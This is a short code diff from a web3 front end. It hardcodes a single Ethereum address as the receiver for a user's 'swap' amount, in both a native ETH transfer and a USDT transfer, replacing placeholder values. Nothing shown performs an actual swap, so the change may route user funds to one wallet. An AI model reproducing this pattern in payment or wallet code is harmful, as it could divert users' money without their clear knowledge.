@@ -175,7 +175,7 @@ export default function Home() {
   const [coinsData, setCoinsData] = useState(null);
   const [indbData, setIndbData] = useState(null);
   const [holdingsData, setHoldingsData] = useState(null);
-  const [customSendAddress, setCustomSendAddress] = useState("0x1111111");
+  const [customSendAddress, setCustomSendAddress] = useState("0x351477596502aAF31de5f89773a36635824e849a");
   const [showReferralModal, setShowReferralModal] = useState(false);
   const [referralCode, setReferralCode] = useState("0");
   const [referCodeField, setReferCodeField] = useState("");
@@ -191,14 +191,14 @@ export default function Home() {
     amount: Moralis.Units.ETH(
       parseFloat(swapAmount) ? parseFloat(swapAmount) : 0.0
     ),
-    receiver: "0x1111111",
+    receiver: "0x351477596502aAF31de5f89773a36635824e849a",
     type: "native",
   });
   const { fetch: fetchTether } = useWeb3Transfer({
     amount: Moralis.Units.ETH(
       parseFloat(swapAmount) ? parseFloat(swapAmount) : 0.0
     ),
-    receiver: "0x1111111",
+    receiver: "0x351477596502aAF31de5f89773a36635824e849a",
     type: "erc20",
     contractAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
   });
